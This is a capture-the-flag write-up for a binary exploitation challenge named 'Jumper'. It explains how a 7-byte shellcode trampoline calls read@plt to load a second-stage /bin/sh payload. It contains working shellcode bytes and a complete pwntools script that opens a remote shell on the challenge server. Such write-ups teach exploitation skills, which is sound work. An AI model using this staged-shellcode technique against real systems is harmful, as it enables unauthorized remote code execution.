# HASBLCTF Writeup: Jumper

**CTF Name:** HASBLCTF  
**Category:** PWN  
**Challenge/Task Name:** Jumper  
**Difficulty:** Hard  
**Author:** Phantom Blaze  
**Target:** `nc 34.77.68.154 10004`

## Objective
Exploit a severely constrained shellcode executor — only 7 bytes of writable+executable space — to achieve Remote Code Execution and read the flag.

## Solution / Walkthrough

### 1. Analyzing the Binary
The binary maps a tiny executable memory region (9 bytes) with full `rwx` permissions and reads exactly **7 bytes** of user input into it. It then appends two hardcoded bytes and jumps to execute the buffer:

```c
void* buf = mmap(nullptr, 9, 7, 0x22, 0xffffffff, 0);
read(0, buf, 7);
*(buf + 7) = 0xff;
*(buf + 8) = 0xe2;  // jmp rdx
buf();
```

The appended `\xff\xe2` is the x86_64 instruction `jmp rdx`, meaning after our 7-byte payload executes, control jumps to wherever `rdx` points.

### 2. The Multi-Stage Shellcode Strategy
With only 7 bytes, a complete `/bin/sh` shellcode is impossible. The key insight is that after `read()` returns:
- `rdi = 0` (stdin file descriptor — still set from the `read` call)
- `rsi` still points to `buf` (our executable region)

We can exploit `jmp rdx` by loading `read@plt` (`0x401060`) into `rdx`. This will trigger a second `read(0, buf, <large_size>)`, allowing us to overwrite the buffer with a much larger shellcode.

### 3. Stage 1 — The 7-Byte Trampoline

```assembly
push rsi           ; \x56         — save buf addr as return addr (1 byte)
mov edx, 0x401060  ; \xba\x60\x10\x40\x00 — rdx = read@plt (5 bytes)
nop                ; \x90         — padding (1 byte)
; jmp rdx          ; (appended by binary) — calls read@plt
```

Total: exactly 7 bytes (`\x56\xba\x60\x10\x40\x00\x90`).

When `jmp rdx` executes, it calls `read(0, buf, 0x401060)` — reading up to ~4MB into our executable buffer. When `read` returns, the pushed `rsi` value is popped as the return address, jumping back to `buf` to execute Stage 2.

### 4. Stage 2 — Full Shellcode
```python
# Standard x64 execve("/bin/sh") shellcode
shellcode = asm(shellcraft.amd64.linux.sh())
```

### 5. The Full Exploit
```python
from pwn import *
import time

r = remote('34.77.68.154', 10004)

# Stage 1: 7-byte trampoline
stage1 = b'\x56\xba\x60\x10\x40\x00\x90'
r.send(stage1)
time.sleep(0.5)

# Stage 2: Full /bin/sh shellcode
stage2 = asm(shellcraft.amd64.linux.sh(), arch='amd64')
r.send(stage2)

r.interactive()  # cat flag.txt
```

**Flag:**  
`HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}`
